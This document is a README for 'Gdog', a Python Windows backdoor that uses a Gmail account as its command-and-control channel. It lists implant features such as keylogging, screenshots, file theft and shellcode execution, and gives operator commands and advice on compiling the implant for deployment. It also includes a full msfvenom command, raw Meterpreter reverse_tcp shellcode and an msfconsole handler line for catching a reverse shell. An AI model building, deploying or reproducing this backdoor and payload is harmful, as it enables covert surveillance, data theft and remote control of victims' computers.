Gdog
====
A stealthy Python based Windows backdoor that uses Gmail as a command and control server

This project was inspired by the gcat(https://github.com/byt3bl33d3r/gcat) from byt3bl33d3r.


Requirements
=====
* Python 2.x
* PyCrypto module
* WMI module
* Enum34 module
* Netifaces module


Features
=====
* Encrypted transportation messages (AES) + SHA256 hashing
* Generate computer unique id using system information/characteristics (SHA256 hash)
* Job IDs are random SHA256 hashes
* Retrieve system information
* Retrieve Geolocation information (City, Country, lat, long, etc..)
* Retrieve running processes/system services/system users/devices (hardware)
* Retrieve list of clients
* Execute system command
* Download files from client 
* Upload files to client
* Execute shellcode
* Take screenshot
* Lock client's screen 
* Keylogger
* Lock remote computer's screen
* Shutdown/Restart remote computer
* Log off current user
* Download file from the WEB
* Visit website
* Show message box to user
* Ability to change check-in time
* Ability to add jitter to check-in time to reduce predictability 


Setup
=====
For this to work you need:
- A Gmail account (**Use a dedicated account! Do not use your personal one!**)
- Turn on "Allow less secure apps" under the security settings of the account.
- You may also have to enable IMAP in the account settings.


Download/Installation
====
* https://sourceforge.net/projects/pywin32
* git clone https://github.com/maldevel/gdog
* pip install -r requirements.txt --user


Contents
=====
- ```gdog.py``` a script that's used to enumerate and issue commands to available clients
- ```client.py``` the actual backdoor to deploy

You're probably going to want to compile ```client.py``` into an executable using [Pyinstaller](https://github.com/pyinstaller/pyinstaller)

**Note: It's recommended you compile client.py using a 32bit Python installation**


Usage
=====
```
                      __
           ____ _____/ /___  ____ _
          / __ `/ __  / __ \/ __ `/
         / /_/ / /_/ / /_/ / /_/ /
         \__, /\__,_/\____/\__, /
        /____/            /____/

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -id ID                Client to target
  -jobid JOBID          Job id to retrieve

  -list                 List available clients
  -info                 Retrieve info on specified client

Commands:
  Commands to execute on an implant

  -cmd CMD                Execute a system command
  -visitwebsite URL       Visit website
  -message TEXT TITLE     Show message to user
  -tasks                  Retrieve running processes
  -services               Retrieve system services
  -users                  Retrieve system users
  -devices                Retrieve devices(Hardware)
  -download PATH          Download a file from a clients system
  -download-fromurl URL
                          Download a file from the web
  -upload SRC DST         Upload a file to the clients system
  -exec-shellcode FILE    Execute supplied shellcode on a client
  -screenshot             Take a screenshot
  -lock-screen            Lock the clients screen
  -shutdown               Shutdown remote computer
  -restart                Restart remote computer
  -logoff                 Log off current remote user
  -force-checkin          Force a check in
  -start-keylogger        Start keylogger
  -stop-keylogger         Stop keylogger
  -email-checkin seconds  Seconds to wait before checking for new commands  
  -jitter percentage      Percentage of Jitter
```


Shellcode Exec
=====

```
$ ./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=172.16.153.1 -f python

No encoder or badchars specified, outputting raw payload
Payload size: 354 bytes
buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += "\xff\xd5\x6a\x05\x68\xac\x10\x99\x01\x68\x02\x00\x11"
buf += "\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
buf += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
buf += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
buf += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
buf += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
buf += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
buf += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
buf += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
buf += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
buf += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xe0"
buf += "\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf += "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf += "\x53\xff\xd5"
```

Get rid of everything except for the shellcode and stick it in a file:

```
$ cat shell.txt 
\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xac\x10\x99\x01\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5
```
run the console

```
 ./msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 172.16.153.1; run"
 ```
